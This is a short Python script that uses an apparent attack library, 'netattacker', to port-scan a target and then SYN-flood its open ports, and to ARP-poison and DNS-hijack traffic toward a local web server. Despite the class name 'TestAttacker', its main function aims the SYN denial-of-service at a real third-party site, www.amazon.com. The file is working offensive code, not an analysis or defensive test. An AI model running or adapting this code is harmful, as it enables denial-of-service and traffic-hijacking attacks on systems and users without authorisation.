import netattacker as sm

class TestAttacker:
	def __init__(self, target:str):
		self.target = target

	def test_syn_dos(self):
		port_scanner = sm.grab('scanners.syn', target=self.target)
		port_scanner.start(verbose=True)

		syn_dos = sm.grab('dos.syn', target=self.target, target_ports=port_scanner.open_ports)
		syn_dos.start()

	def test_dns_hijacker(self):
		arp_instance = sm.grab('poisoners.arp', target=self.target)

		arp_instance.print_target_ip()

		dns_hijacker = sm.grab('poisoners.dns', target=self.target, webserver_ipv4='192.168.1.4')
		dns_hijacker.start()


def main():
	a = TestAttacker(target="www.amazon.com")
	a.test_syn_dos()
	# a.test_1('test')

if __name__ == "__main__":
	main()